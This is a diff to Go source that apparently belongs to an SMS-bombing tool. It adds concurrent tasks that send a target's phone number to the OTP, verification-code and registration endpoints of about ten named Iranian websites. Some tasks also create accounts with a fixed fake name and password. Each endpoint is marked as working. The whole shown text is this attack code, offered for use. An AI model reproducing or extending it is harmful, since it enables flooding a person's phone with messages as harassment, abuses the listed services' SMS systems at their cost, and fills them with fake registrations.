@@ -487,12 +487,146 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
+// --- agahclinic.com (Form) ✅
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("action", "voorodak__submit-username")
+        formData.Set("username", phone)
+        formData.Set("security", "72e3da03cd")
+        sendFormRequest(c, ctx, "https://agahclinic.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+}(client)
 
+// --- taraz.org ✅
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "phone_number": phone,
+        }
+        sendJSONRequest(c, ctx, "https://app.taraz.org/api/core/v2/user/request_web_otp_sms/", payload, &wg, ch)
+    }
+}(client)
 
+// --- hamkadeh.com (JSON) ✅
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "mobile": phone,
+            "type": "sms",
+            "captcha": "",
+        }
+        sendJSONRequest(c, ctx, "https://api.hamkadeh.com/api/site/auth/login/send-code", payload, &wg, ch)
+    }
+}(client)
+// --- quera.org ✅
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "phone_number": phone,
+            "country_code": "+98",
+            "captcha_token": "",
+        }
+        sendJSONRequest(c, ctx, "https://quera.org/accounts/api/register/phone/otp", payload, &wg, ch)
+    }
+}(client)
+// --- mozafarinia.com (Form) ✅
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("action", "digits_check_mob")
+        formData.Set("countrycode", "+98")
+        formData.Set("mobileNo", formatPhoneWithSpaces(phone))
+        formData.Set("csrf", "6c597fec7e")
+        formData.Set("login", "2")
+        formData.Set("username", "")
+        formData.Set("email", "")
+        formData.Set("captcha", "")
+        formData.Set("captcha_ses", "")
+        formData.Set("digits", "1")
+        formData.Set("json", "1")
+        formData.Set("whatsapp", "0")
+        formData.Set("digits_reg_name", "مانس")
+        formData.Set("digits_reg_text1610", "مین")
+        formData.Set("digits_reg_mail", formatPhoneWithSpaces(phone))
+        formData.Set("digregcode", "+98")
+        formData.Set("digits_reg_password", "monsmain@")
+        formData.Set("dig_otp", "")
+        formData.Set("code", "")
+        formData.Set("dig_reg_mail", "")
+        formData.Set("dig_nounce", "6c597fec7e")
+        sendFormRequest(c, ctx, "https://mozafarinia.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+}(client)
 
+// --- haal.ir (JSON) ✅
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "DeviceId": "undefined",
+            "Email": "",
+            "Password": "",
+            "PlatformName": "WebApplication",
+            "IsEnergyDana": false,
+            "UserName": phone,
+        }
+        sendJSONRequest(c, ctx, "https://haal.ir/api/v2/User/UserRegisterVerifyWeb", payload, &wg, ch)
+    }
+}(client)
 
+// --- tikkaa.ir ✅
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "mobile": phone,
+        }
+        sendJSONRequest(c, ctx, "https://api.tikkaa.ir/api/user/register/first", payload, &wg, ch)
+    }
+}(client)
 
-
+// --- englishturbo.com ✅
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("first_name", "مانس")
+        formData.Set("last_name", "مین")
+        formData.Set("phone_mobile", phone)
+        formData.Set("password", "monsmain@")
+        sendFormRequest(c, ctx, "https://backwapp.englishturbo.com/api/v1/reg-user/", formData, &wg, ch)
+    }
+}(client)
+// --- bonyani.ir ✅
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "emailOrPhoneNo": getPhoneNumberPlus98NoZero(phone),
+            "terminal":       101,
+            "terminalVersion": 50502,
+            "sendOtp":        false,
+        }
+        sendJSONRequest(c, ctx, "https://api.bonyani.ir/Auth/VerificationCode/GetForLogin", payload, &wg, ch)
+    }
+}(client)
+// --- paresh.ir ✅
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "phone_number": phone,
+            "return_to":    "/",
+        }
+        sendJSONRequest(c, ctx, "https://api.paresh.ir/api/user/otp/code/", payload, &wg, ch)
+    }
+}(client)
 
 //yeki az ina...
 // --- my.limoome.com  ✅ 
